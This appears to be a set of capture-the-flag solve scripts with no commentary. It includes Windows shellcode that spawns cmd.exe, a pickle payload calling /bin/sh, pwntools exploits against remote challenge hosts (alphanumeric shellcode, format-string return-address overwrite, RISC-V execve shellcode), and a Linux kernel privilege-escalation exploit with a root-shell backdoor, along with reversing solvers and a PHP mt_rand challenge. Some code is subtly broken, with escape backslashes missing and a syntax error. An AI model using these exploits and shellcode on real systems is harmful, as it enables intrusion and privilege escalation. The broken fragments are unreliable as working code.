#p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex01xdax31xf6x89xd6x31xffx89xdfx31xc9x51x68x61x72x79x41x68x4cx69x62x72x68x4cx6fx61x64x54x53xffxd2x83xc4x0cx31xc9x68x65x73x73x42x88x4cx24x03x68x50x72x6fx63x68x45x78x69x74x54x57x31xffx89xc7xffxd6x83xc4x0cx31xc9x51x68x64x6cx6cx41x88x4cx24x03x68x6cx33x32x2ex68x73x68x65x6cx54x31xd2x89xfax89xc7xffxd2x83xc4x0bx31xc9x68x41x42x42x42x88x4cx24x01x68x63x75x74x65x68x6cx45x78x65x68x53x68x65x6cx54x50xffxd6x83xc4x0dx31xc9x68x65x78x65x41x88x4cx24x03x68x63x6dx64x2ex54x59x31xd2x42x52x31xd2x52x52x51x52x52xffxd0xffxd7'
sleep(1)
#p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx48x10x31xdbx8bx59x3cx01xcbx8bx5bx78x01xcbx8bx73x20x01xcex31xd2x42xadx01xc8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx73x1cx01xcex8bx14x96x01xcax89xd6x89xcfx31xdbx68x79x41x41x41x66x89x5cx24x01x68x65x6dx6fx72x68x65x72x6fx4dx68x52x74x6cx5ax54x51xffxd2x83xc4x10x31xc9x89xcaxb2x54x51x83xecx54x8dx0cx24x51x52x51xffxd0x59x31xd2x68x73x41x42x42x66x89x54x24x02x68x6fx63x65x73x68x74x65x50x72x68x43x72x65x61x8dx14x24x51x52x57xffxd6x59x83xc4x10x31xdbx68x65x78x65x41x88x5cx24x03x68x63x6dx64x2ex8dx1cx24x31xd2xb2x44x89x11x8dx51x44x56x31xf6x52x51x56x56x56x56x56x56x53x56xffxd0x5ex83xc4x08x31xdbx68x65x73x73x41x88x5cx24x03x68x50x72x6fx63x68x45x78x69x74x8dx1cx24x53x57xffxd6x31xc9x51xffxd0'
#p2 = 'x31xc9x64xa1x30x00x00x00x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex01xdax31xf6x52x5ex31xffx53x5fx31xc9x51x68x78x65x63x00x68x57x69x6ex45x89xe1x51x53xffxd2x31xc9x51x68x65x73x73x00x68x50x72x6fx63x68x45x78x69x74x89xe1x51x57x31xffx89xc7xffxd6x31xf6x50x5ex31xc9x51x68x65x78x65x00x68x63x6dx64x2ex89xe1x6ax00x51xffxd7x6ax00xffxd6xffxffxffxffx00x00x00xffxffxffxffx00x00x00'
#p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex01xdax31xf6x89xd6x31xc9x51x68x61x72x79x41x68x4cx69x62x72x68x4cx6fx61x64x89xe1x51x53xffxd2x31xc9x66xb9x6cx6cx51x68x72x74x2ex64x68x6dx73x76x63x89xe1x51xffxd0x31xffx89xc7x31xd2x52x66xbax65x6dx52x68x73x79x73x74x89xe1x51x57x31xd2x89xf2xffxd2x31xc9x66xb9x66x6fx51x68x65x6dx69x6ex68x73x79x73x74x89xe1x51xffxd0x31xc9x66xb9x63x68x51x68x5fx67x65x74x89xe1x51x57x31xd2x89xf2xffxd2xffxd0x31xd2x52x68x65x78x69x74x89xe1x51x57xffxd6xffxd0'
r.sendline(p2)

p3 = b'a' * (0x14 + 4)
p3 += p32(bss_addr)
p3 += p32(bss_addr)
r.sendlineafter('Enter your name: ', p3)

sleep(5)
r.sendline('dir')

#r.sendline('calc')
r.interactive()
# midnight{i_prefer_sun_solaris_doors_over_microsoft_windows}
```



```
cos
system
(S'/bin/sh'
tR.
#Y29zCnN5c3RlbQooUycvYmluL3NoJwp0Ui4=
```



```
from pwn import *
from struct import pack
from ctypes import *
from LibcSearcher import *
import base64

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def pr():
    print(p.recv())
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

context(os='windows', arch='i386', log_level='debug')
#p = process('./pwn')
p = remote('scaas-1.play.hfsc.tf', 1337)
elf = ELF('./pwn')
#libc = ELF('./libc-2.27-x64.so')
#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
sla(b'> ', b'1')
rl(b'Here is your SCAAS service: (n')
text = b''
for i in range(83):
    text += rl(b'n')[:-1]
a = base64.b64decode(text)

with open('./pwn', 'rb+') as f:
    f.write(a)
```



```
for i in range(0xfffffff):
    a = 8511 * i
    if a > 0xffffffff:
        b = str(hex(a))
        c = b[-8:]
        d = int(c, 16)
        if d % 0x2B27EA == 24486:
            print(i)
```



```
from pwn import *
from struct import pack
from ctypes import *
from LibcSearcher import *
import base64

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def pr():
    print(p.recv())
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

context(os='linux', arch='i386', log_level='debug')
#p = process('./pwn')
p = remote('scaas-1.play.hfsc.tf', 1337)
elf = ELF('./pwn')
#libc = ELF('./libc-2.27-x64.so')
#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')

#gdb.attach(p, 'b *$rebase(0x1609)')

sla(b'> ', b'2')
sla(b'0: ', str(0x916D00))
sla(b'1: ', str(0x707817))
sla(b'2: ', str(1))
sla(b'3: ', str(0x840BC2))
sla(b'4: ', str(0x89228A))

sla(b'0: ', str(1243932))
sla(b'1: ', str(3103430))
sla(b'2: ', str(262505 - 456))
sla(b'3: ', str(262505))
sla(b'4: ', str(0x2b7))

sla(b'0: ', str(2124890))
sla(b'1: ', str(9874561))
sla(b'2: ', str(6280405 + 3274 + 4728))
sla(b'3: ', str(6280405))
sla(b'4: ', str(0))

sla(b'bytes): ', 'PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA')
inter()
#pause()
```



```
from pwn import *
from struct import pack
from ctypes import *
from LibcSearcher import *
import base64

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def pr():
    print(p.recv())
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

context(os='linux', arch='amd64'', log_level='debug')
#p = process('./pwn')
p = remote('scaas-1.play.hfsc.tf', 1337)
elf = ELF('./pwn')
#libc = ELF('./libc-2.27-x64.so')
#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
#gdb.attach(p, 'b *$rebase(0x15ac)')
sa(b'c0de: ', asm(shellcraft.open('flag') + shellcraft.read(3, 'rsp', 0x30) + shellcraft.write(1, 'rsp', 0x30)))
pr()
#pause()
```



```
from pwn import *
from struct import pack
from ctypes import *
from LibcSearcher import *
import base64

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def pr():
    print(p.recv())
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

context(os='linux', arch='i386', log_level='debug')
#p = process('./pwn')
p = remote('spdb-1.play.hfsc.tf', 40002)
elf = ELF('./pwn')
#libc = ELF('./libc-2.27-x64.so')
#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')

#
sla(b'guess: ', b'%1$p%3$p')
rl(b'0x')
stack = int(p.recv(8), 16)
ret = stack + 0xdc
vuln_ret = stack + 0x8c
i = stack + 0xac
rl(b'0x')
pro_base = int(p.recv(8), 16) - 0x1311
shell = pro_base + 0x138D

sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str(ret & 0xff).encode() + b'c%18$hhn'
sla(b'guess: ', payload)
sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str(shell & 0xff).encode() + b'c%34$hn'
sla(b'guess: ', payload)

sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str((ret + 1) & 0xff).encode() + b'c%18$hhn'
sla(b'guess: ', payload)
sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str((shell >> 8) & 0xff).encode() + b'c%34$hn'
sla(b'guess: ', payload)

sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str((ret + 2) & 0xff).encode() + b'c%18$hhn'
sla(b'guess: ', payload)
sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str((shell >> 16) & 0xff).encode() + b'c%34$hn'
sla(b'guess: ', payload)

sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str((ret + 3) & 0xff).encode() + b'c%18$hhn'
sla(b'guess: ', payload)
payload = b'%' + str((shell >> 24) & 0xff).encode() + b'c%34$hn'
sla(b'guess: ', payload)

inter()
#gdb.attach(p, 'b *$rebase(0x1369)')
print(' stack -> ', hex(stack))
print(' ret -> ', hex(ret))
print(' pro_base -> ', hex(pro_base))
#pause()
```



```
from pwn import *
from struct import pack
from ctypes import *
from LibcSearcher import *
import base64

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def pr():
    print(p.recv())
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

context(os='linux', arch='amd64', log_level='debug')
#p = process(['qemu-riscv64', './pwn'])
p = remote('spdc-1.play.hfsc.tf', 40003)
elf = ELF('./pwn')
#libc = ELF('./libc-2.27-x64.so')
#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')

shellcode = b"x01x11x06xecx22xe8x13x04x21x02xb7x67x69x6ex93x87xf7x22x23x30xf4xfexb7x77x68x10x33x48x08x01x05x08x72x08xb3x87x07x41x93x87xf7x32x23x32xf4xfex93x07x04xfex01x46x81x45x3ex85x93x08xd0x0dx73x00x00x00"

sla(b'c0de: ', shellcode)

inter()
```



```
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
#include <signal.h>
#include <unistd.h>
#include <syscall.h>
#include <pthread.h>
#include <poll.h>
#include <linux/userfaultfd.h>
#include <linux/fs.h>
#include <sys/shm.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#define ut uint64_t

void backdoor(){
    system("/bin/sh");
}
void get_root(){
    __asm__(
        "mov rdi, 0;"
        "mov rax, 0xffffffff81055db0;"
        "call rax;"
        "mov rdi, rax;"
        "mov rax, 0xffffffff81055f00;"
        "call rax;"
            );
}
ut user_cs, user_ss, user_rsp, user_flag;
void save_status(){
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_flag;"
            );
}
int main(){
    save_status();
    int fd = open("/dev/vuln", 2);
    ut buf[50] = {0};
    buf[33] = (ut)get_root;
    buf[34] = 0xffffffff81400c36; //kpti_trampoline
    buf[35] = 0;
    buf[36] = 0;
    buf[37] = (ut)backdoor;
    buf[38] = user_cs;
    buf[39] = user_flag;
    buf[40] = user_rsp;
    buf[41] = user_ss;

    write(fd, buf, sizeof(buf));
    puts("[+]root");
    return 0;
}
```



```
static main(void)
{
  auto fp, begin, end, dexbyte;
  fp = fopen("C:\Users\Equinox\Desktop\elf", "wb");
  begin = 0x07F84B1E76010;
  end = begin + 0x4ff88;
  for ( dexbyte = begin; dexbyte < end; dexbyte ++ )
      fputc(Byte(dexbyte), fp);
}
```



```
from z3 import *
from ctypes import *
from Crypto.Util.number import long_to_bytes
a1 = BitVec('flag', 16)
s = Solver()
# def check1(): #'_u'
#     v3 = 0
#     for  i in range(16):
#         v4 = ((1 << i) & a1) >> i
#         if  (i & 3) != 0 :
#             if  i % 4 == 1 :
#                 v3 |= ((((1 << i) & 0xA55A) >> i) ^ v4) << i  
#             else:
#                 if  i % 4 == 2 :
#                     v1 = ((((1 << i) & 0xA55A) >> i) ^ v4) << i
#                 else:
#                     v1 = ((((1 << i) & 0x5AA5) >> i) ^ v4) << i
#                 v3 |= v1
#         else:
#             v3 |= ((((1 << i) & 0x5AA5) >> i) ^ v4) << i
#     s.add(v3 == 0x63B6)

def check2(): #b'3b'
    # v3 = 0
    # v4 = 1
    # for i in range(16):
    #     if (v4 & a1) != 0 :
    #         v1 = 0
    #     else:
    #         v1 = v4
    #     v3 |= v1
    #     v4 *= 2
    # s.add(v3 == 0xFFFFCC9D)
    
    for i in range(65535):
        v3 = 0
        v4 = 1
        for j in range(16):
            if v4 & i != 0 :
                v1 = 0
            else:
                v1 = v4
            v3 |= v1
            v4 *= 2
            v4 &= 0xFFFF
        if v3 == 0xCC9D:
            print(i)
            break

def check3(): # b't4'
    for i in range(65535):
        t = i
        for j in range(16):
            v4 = t & 1
            t >>= 1
            if  v4 :
                t ^= 0xB400
        if t == 18718:
            print(i)
            break
    #s.add(a1 == 18718) 

def check4():
    a2 = 0x1337
    for i in range(65535):
        t = i
        if ((t << 8)&0xffff | ((a2 + t) ^ ((t >> 8) & 0xff))&0xffff)&0xffff == 24546:
            print(i)
            break
 # s.add(((a1 << 8) | ((a2 + a1) ^ (a1 >> 8 & 0xff))) == 24546)

def check5(): # b'3h'
#     if a1&1 != 0:
#        a2 = 3
#        s.add(((a1 << a2) | (a1 >> (16 - a2))) == 107808365) 
#     else:
#         a2 = 3
#         s.add((a1 >> a2 == 107808365) | (a1 << (16 - a2)))
    for i in range(65535):
        t = i
        # if t&1 != 0:
        #     a2 = 3
        #     if ((t << a2) | (t >> (16 - a2))) == 107808365:
        #         print(i)
        #         break
        # else:
        a2 = 3
        if (t >> a2) == (107808365 &0xffff):
            print(i)
            break

def check6(): # b'c_'
    v2 = 0
    for i in range(16):
        v2 |= ((a1 >> i) & 1) << (15 - i)     
    s.add(v2 == 64198)

def check7(): # b'xf0x0c'
#     s.add(a1^0xf00d == 1)
    for i in range(65535):
        t = i
        if (t^0xf00d) == 1:
            print(i)
            

# def check8(): #kc
#     a2 = 0x6907
#     s.add(((16 * ((((a1 >> 4) & 0xF) + ((a2 >> 4) & 0xF)) & 0xF)) | (((((a1 >> 8 &0xff) & 0xF) + ((a2>> 8 &0xff) & 0xF)) & 0xF) << 8) | ((((a2 >> 12) * (a1 >> 12)) & 0xF) << 12) | ((a2 & 0xF) * (a1 & 0xF)) & 0xF) == 17509)
#     a2 = 0x9231
#     s.add(((16 * ((((a1 >> 4) & 0xF) + ((a2 >> 4) & 0xF)) & 0xF)) | (((((a1 >> 8 &0xff) & 0xF) + ((a2 >> 8 &0xff) & 0xF)) & 0xF) << 8) | ((((a2 >> 12) * (a1 >> 12)) & 0xF) << 12) | ((a2 & 0xF) * (a1 & 0xF)) & 0xF)== 28051)

check4()
# print(s.check())
# print(s.model())
print(long_to_bytes(13160))

#_u3bt4  3hc_  kc
#u_b34t_th3_crack
```



```
from z3 import *

def rol_4(R2K):
    return (((R2K)<<4)|((R2K)>>4))
def xor_byte(A9W,B8X):
    return (((A9W)^(B8X))&0xff)
def Y2G(A9W,B8X):
    return ((A9W)&0x55)|(((B8X)&0xaa)>>1)
def W4U(A9W,B8X):
    return ((((A9W)*(B8X))%1257)&0xff)
def V5H(T3S):
    return (((T3S)<<1)|((T3S)>>7))
def S6E(T3S):
    return (((T3S)<<3)^((T3S)>>5))
def D7F(A9W,B8X):
    return (((A9W)<<4)^(B8X))
def A1C(P6F,Q5G,R4H,S3I):
    return rol_4(W4U(V5H(rol_4(Y2G(V5H(xor_byte(P6F,Q5G)),V5H(xor_byte(R4H,S3I))))),Q5G))
def B2D(P6F,Q5G):
    return V5H(rol_4(xor_byte(P6F,Q5G)))
def C3E(P6F,Q5G):
    return D7F(Q5G,rol_4(xor_byte(P6F,Q5G)))
def D4F(P6F,Q5G):
    return ((P6F)^(Q5G))
def F2J(K2L):
    return (V5H(rol_4(K2L)))
def E1I(K2L, q1s):
    return W4U(V5H(rol_4(K2L)), q1s)
def G3K(K2L):
    return S6E(K2L)

s = Solver()

flag =  [BitVec(('flag%s' % i),32) for i in range(24) ]
#flag =  [Int(('flag%s' % i)) for i in range(24) ]

p5f=[16,0,8,20,14,12,18,2,22,10,6,4]
i = 0
j9n = [0x1010, 024050, 034070, 28784, 0x12d2d, 0x10d0d, 042104, 012024, 0xc4c4, 0156334, 0x16161, 0270561]
g7k = [0,0,0,0,0,0]
h8m = [0,0,0,0,0,0]

for i in range(0,24):
    s.add(flag[i] > 32)
    s.add(flag[i] < 128)

for i in range(0, 24, 4):
    if i < 12:
        s.add(F2J(B2D(flag[p5f[i+3]],flag[p5f[i+3]+1])) == j9n[p5f[i+3]/2])
        g7k[i/4]=D4F(C3E(flag[i*2],flag[i*2+2]),C3E(flag[i*2+4],flag[i*2+6]))
        g7k[(i/4)+3]= D4F(C3E(flag[i*2+1],flag[i*2+3]),C3E(flag[i*2+5],flag[i*2+7]))
        s.add(F2J(B2D(flag[p5f[i+1]],flag[p5f[i+1]+1])) == j9n[p5f[i+1]/2])
        s.add(F2J(B2D(flag[p5f[i+2]],flag[p5f[i+2]+1])) == j9n[p5f[i+2]/2])
        s.add(F2J(B2D(flag[p5f[i]],flag[p5f[i]+1])) == j9n[p5f[i]/2])
        if i<4:
            h8m[i/4]=A1C(flag[i],flag[i+4],flag[i+8],flag[i+12])
        if i==4:
            h8m[1]=A1C(flag[16],flag[20],flag[1],flag[5])
    else:
        if i < 16:
            h8m[i/6]=A1C(flag[i-3],flag[i+1],flag[i+5],flag[i*2-3])
            h8m[3]=A1C(flag[2],flag[6],flag[10],flag[14])
h8m[4]=A1C(flag[18],flag[22],flag[3],flag[7])
h8m[5]=A1C(flag[11],flag[15],flag[19],flag[23])

s.add(E1I(h8m[0], 1) == 0x5b)
s.add(E1I(h8m[1], 2) == 13)
s.add(E1I(h8m[2], 3) == 0x5D)
s.add(E1I(h8m[3], 4) == 0244)
s.add(E1I(h8m[4], 5) == 52)
s.add(E1I(h8m[5], 6) ==0xDC)

mul_num = 0
for i in range(24):
    mul_num = ((mul_num*251)^flag[i]) & 0xffffffff

s.add(mul_num == 0x4E6F76D0)

s.add(G3K(g7k[0])==0x202)
s.add(G3K(g7k[1])==0x1aa2)
s.add(G3K(g7k[2])==0x5a5)
s.add(G3K(g7k[3])==03417)
s.add(G3K(g7k[4])==0x3787)
s.add(G3K(g7k[5])==030421)
s.add(flag[0] == 109)
s.add(flag[1] == 105)
s.add(flag[2] == 100)
s.add(flag[3] == 110)
s.add(flag[4] == 105)
s.add(flag[5] == 103)
s.add(flag[6] == 104)
s.add(flag[7] == 116)
s.add(flag[8] == 123)
s.add(flag[23] == 125)

print(s)
print(s.check())
m = s.model()
print m
for i in range(0,24):
    print (chr(int("%s" % (m[flag[i]]))))
```



```
switch ( (i + 1) * (v7 % 6) % 6 )
    {
      case 0:
        if ( !_setjmp(env) )
          magic = dword_559E227B81A8 / 0;       // 857 check SIGFPE
        break;
      case 1:
        magic = 99;
        if ( !_setjmp(env) )
          BUG();                                // 841 check SIGILL
        return result;
      case 2:
        if ( !_setjmp(env) )
          magic = (1.797693134862316e308 * dword_559E227B81A4 + dword_559E227B81A8);// 0x80000000
        break;
      case 3:                                   // 1
        _setjmp(env);
        ++magic;
        break;
      case 4:
        if ( !_setjmp(env) )
        {
          v3 = dword_559E227B81A8 - (dword_559E227B81A4 * dword_559E227B81AC) / 0.0;// 0x80000000
          magic = v3;
        }
        break;
      case 5:
        if ( !_setjmp(env) )
          sub_559E227B547A();                   // 981 check SIGSEGV
        return result;
      default:
        break;
    }
```



```
mov edx, cs:magic
movsxd rdx, edx
```



```
#include <iostream>
#include<vector>
using namespace std;
unsigned char ida_chars[] =
{
  0xF5, 0x9B, 0x12, 0xAF, 0x7A, 0x23, 0x59, 0x8E, 0x1B, 0x17,
  0x03, 0x19, 0x09, 0x05, 0x2C, 0x3E, 0x0E, 0x38, 0x28, 0x05,
  0x2C, 0x3E, 0x0E, 0x38, 0x40, 0x17, 0x28, 0x27, 0x11, 0x0D,
  0x26, 0x25, 0x35, 0x33, 0x09, 0x38, 0x19, 0x2C, 0x40, 0x08,
  0x3E, 0x0E, 0x38, 0x1E, 0x40, 0x08, 0x3E, 0x0E, 0x38, 0x1B,
  0x09, 0x19, 0x27, 0x21, 0x0D, 0x1B, 0x25, 0x35, 0x3A, 0xD1,
  0x04, 0xF8, 0xBC, 0x34, 0x23, 0x38, 0xEB, 0x98, 0x48, 0x14,
  0x32, 0x95, 0x7B, 0x91, 0x8D, 0x82, 0x9F, 0x86, 0xF8, 0x91,
  0xC8, 0x78, 0xDE, 0x4E, 0x21, 0xAA, 0xFB, 0x5B
};
vector<char> flagn;
unsigned long long  magic[] = { 0x359 ,841 ,0xffffffff80000000,1,0xffffffff80000000 ,981 };
int get_byte = 0;
int start = 0;
int break_triger = 0;
void dfs(int depeth,int pre,int num) {
 if (num == 25)
 {
  for(int i=0;i<25;i++)
  {
   printf("%c", flagn[i]);
  }
  printf("n");
  return;
 }
 int key = (depeth + 1) * pre % 6;
 int flag = 0;
 for (int i = 32; i < 126; i++)
 {
  if (((i + 177573LL) * magic[key]) % 0x41 == ida_chars[depeth])
  {
   char re = i;
   flagn.push_back(re);
   flag=1;
   dfs(depeth+1,i,num+1);
   flagn.pop_back();
  }
 }
 if (flag == 0)return;
}

int main() {
 dfs(9,123, 0);
}
```



```
<?php
session_start();

$flag = "";

function flag_to_numbers($flag) {
    $numbers = [];
    foreach (str_split($flag) as $char) {
        $numbers[] = ord($char);
    }
    return $numbers;
}

function non_continuous_sample($min, $max, $gap_start, $gap_end) {
    $rand_num = mt_rand($min, $max - ($gap_end - $gap_start));
    if ($rand_num >= $gap_start) {
        $rand_num += ($gap_end - $gap_start);
    }
    return $rand_num;
}

if(!str_starts_with($flag, "midnight{")){
    echo "Come back later.n";
    exit();
}

$flag_numbers = flag_to_numbers($flag);

if (isset($_GET['generate_samples'])) {
    header('Content-Type: application/json');

    // Maybe we can recover these constants 
    $min = 0;
    $max = 0;
    $gap_start = 0;
    $gap_end = 0;
    $seed = mt_rand(0, 10000); // Varying seed
    $samples = [];

    foreach ($flag_numbers as $number) {
        mt_srand($seed + $number);
        $samples[] = non_continuous_sample($min, $max, $gap_start, $gap_end);
    }

    echo json_encode(["samples" => $samples]);
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mt. Random</title>
</head>
<body>
    <h1>Hiking Guide</h1>
    <p>This mountain is boring, I'm going to sample alot of seeds!</p>
    <a href="?generate_samples=1">Get a new sample</a>
</body>
</html>
```



```
import requests

samples = []
for i in range(100):
    try:
        res = requests.get("http://mtrandom-1.play.hfsc.tf:51237/?generate_samples=1").json()["samples"]
        samples.append(res)
    except Exception as e:
        pass
print(samples)
```



```
from collections import Counter

samples = [[1, 183, 26, 150, 183, 14, 60, 207, 99, 1, 209, 150, 26, 89, 207, 60, 198, 89, 14, 238, 76, 68],
           [228, 45, 158, 24, 45, 246, 244, 233, 29, 228, 30, 24, 158, 177, 233, 244, 74, 177, 246, 2, 158, 248],
           [173, 99, 219, 207, 99, 59, 223, 218, 42, 173, 180, 207, 219, 81, 218, 223, 179, 81, 59, 246, 227, 202],
           [15, 14, 39, 30, 14, 228, 75, 19, 7, 15, 17, 30, 39, 21, 19, 75, 209, 21, 228, 179, 150, 99],
           [156, 248, 14, 183, 248, 220, 171, 19, 191, 156, 246, 183, 14, 84, 19, 171, 33, 84, 220, 188, 91, 87],
           [31, 30, 224, 90, 30, 32, 195, 63, 183, 31, 174, 90, 224, 186, 63, 195, 59, 186, 32, 38, 183, 27],
           [151, 150, 240, 219, 150, 237, 32, 26, 36, 151, 85, 219, 240, 253, 26, 32, 70, 253, 237, 9, 232, 85],
           [87, 253, 96, 223, 253, 165, 63, 197, 212, 87, 159, 223, 96, 84, 197, 63, 188, 84, 165, 210, 226, 82],
           [97, 217, 161, 59, 217, 169, 170, 26, 221, 97, 156, 59, 161, 81, 26, 170, 235, 81, 169, 231, 180, 229],
           [187, 186, 162, 225, 186, 66, 228, 153, 89, 187, 12, 225, 162, 32, 153, 228, 29, 32, 66, 75, 165, 71],
           [6, 1, 159, 37, 1, 189, 31, 167, 213, 6, 225, 37, 159, 90, 167, 31, 224, 90, 189, 197, 37, 250],
           [150, 232, 220, 196, 232, 65, 88, 208, 175, 150, 57, 196, 220, 90, 208, 88, 61, 90, 65, 34, 231, 189],
           [92, 170, 63, 183, 170, 255, 11, 42, 20, 92, 219, 183, 63, 169, 42, 11, 84, 169, 255, 196, 48, 38],
           [243, 150, 250, 167, 150, 185, 183, 227, 158, 243, 29, 167, 250, 206, 227, 183, 1, 206, 185, 96, 223, 254],
           [8, 17, 89, 84, 17, 75, 64, 72, 247, 8, 213, 84, 89, 180, 72, 64, 235, 180, 75, 99, 92, 189],
           [165, 75, 66, 256, 75, 254, 230, 196, 193, 165, 75, 256, 66, 44, 196, 230, 3, 44, 254, 151, 94, 55],
           [225, 253, 249, 24, 253, 152, 92, 65, 206, 225, 183, 24, 249, 235, 65, 92, 158, 235, 152, 201, 158, 72],
           [218, 204, 179, 256, 204, 12, 235, 89, 32, 218, 7, 256, 179, 183, 89, 235, 88, 183, 12, 217, 39, 190],
           [25, 234, 237, 82, 234, 88, 232, 27, 207, 25, 219, 82, 237, 252, 27, 232, 68, 252, 88, 89, 240, 35],
           [46, 208, 181, 209, 208, 74, 84, 48, 193, 46, 191, 209, 181, 153, 48, 84, 218, 153, 74, 198, 41, 21],
           [57, 1, 90, 221, 1, 183, 243, 190, 150, 57, 220, 221, 90, 41, 190, 243, 197, 41, 183, 183, 247, 159],
           [12, 256, 81, 5, 256, 221, 12, 15, 74, 12, 194, 5, 81, 94, 15, 12, 156, 94, 221, 151, 17, 82],
           [84, 211, 170, 74, 211, 206, 211, 163, 60, 84, 246, 74, 170, 159, 163, 211, 180, 159, 206, 90, 69, 214],
           [220, 17, 158, 226, 17, 251, 203, 14, 6, 220, 215, 226, 158, 55, 14, 203, 81, 55, 251, 92, 89, 31],
           [34, 94, 225, 225, 94, 31, 248, 63, 33, 34, 185, 225, 225, 60, 63, 248, 71, 60, 31, 206, 183, 97],
           [178, 157, 172, 97, 157, 213, 29, 218, 151, 178, 252, 97, 172, 210, 218, 29, 97, 210, 213, 28, 156, 90],
           [56, 196, 215, 172, 196, 222, 183, 83, 96, 56, 95, 172, 215, 1, 83, 183, 14, 1, 222, 210, 195, 237],
           [65, 17, 221, 62, 17, 180, 97, 81, 71, 65, 232, 62, 221, 15, 81, 97, 30, 15, 180, 163, 82, 10],
           [35, 38, 202, 1, 38, 242, 230, 207, 11, 35, 193, 1, 202, 157, 207, 230, 41, 157, 242, 191, 235, 24],
           [160, 183, 222, 11, 183, 199, 61, 44, 239, 160, 202, 11, 222, 229, 44, 61, 56, 229, 199, 7, 190, 208],
           [211, 181, 84, 42, 181, 40, 152, 75, 239, 211, 187, 42, 84, 80, 75, 152, 205, 80, 40, 229, 197, 88],
